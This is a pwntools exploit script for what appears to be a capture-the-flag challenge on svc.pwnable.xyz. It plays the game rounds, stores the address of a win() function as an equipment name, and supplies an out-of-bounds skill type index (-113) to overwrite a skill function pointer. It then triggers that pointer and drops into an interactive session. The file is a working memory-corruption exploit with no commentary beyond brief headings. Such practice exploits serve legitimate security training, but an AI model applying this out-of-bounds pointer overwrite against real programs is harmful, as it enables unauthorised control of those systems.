from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30020)

sla = r.sendlineafter

win = 0x401372


# rank up

for game in range(3):
    while 1:
        r.recvuntil('Round (')
        turn = r.recvuntil(')')[:-1]
        if turn == b'END':
            break
        elif turn == b'Player':
            sla('Which skill do you want to use : ', '1')
            sla('Which target you want to use that skill on : ', '0')
    
    if game == 1:
        sla('Do you want to change your equip (y/n)? : ', 'n')


# write win() at Skill_Func

sla('Do you want to change your equip (y/n)? : ', 'y')
sla('Name for your equip: ', p64(win))

sla('Do you want to change the type of your skills (y/n)? : ', 'y')
sla('Which skill do you want to change (3 to exit): ', '0')
sla('What type of skill is this (0: Heal, 1: Attack): ', '-113')

sla('Which skill do you want to change (3 to exit): ', '3')


# call win()

sla('Which skill do you want to use : ', '0')
sla('Which target you want to use that skill on : ', '0')


r.interactive()